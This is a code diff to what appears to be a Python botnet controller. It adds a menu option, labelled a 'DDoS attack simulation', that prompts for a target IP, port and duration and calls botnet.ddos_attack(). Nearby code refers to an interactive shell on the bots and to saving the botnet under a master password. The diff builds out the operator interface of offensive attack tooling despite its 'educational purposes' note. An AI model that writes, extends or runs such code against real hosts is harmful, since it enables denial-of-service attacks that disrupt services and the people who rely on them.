@@ -54,8 +54,34 @@ def main():
             botnet.interactive_shell()
 
         elif choice == '6':
-            # We'll implement this in the next step
-            print("[!] DDoS attack simulation not yet implemented.")
+            print("\n=== DDoS Attack Simulation ===")
+            print("NOTE: This is for educational purposes only.")
+
+            target_ip = input("Enter target IP address: ")
+
+            import re
+            if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', target_ip):
+                print("[!] Invalid IP address format.")
+                continue
+
+            try:
+                target_port = int(input("Enter target port: "))
+                if not (0 < target_port < 65536):
+                    print("[!] Port must be between 1-65535.")
+                    continue
+            except ValueError:
+                print("[!] Invalid port number.")
+                continue
+
+            try:
+                duration = int(
+                    input("Enter the duration of attack in seconds(1-30): "))
+                duration = max(1, min(duration, 30))
+            except ValueError:
+                duration = 10
+                print(f"[*] Using default duration: {duration} seconds")
+
+            botnet.ddos_attack(target_ip, target_port, duration)
 
         elif choice == '7':  # Save botnet
             master_password = getpass.getpass(
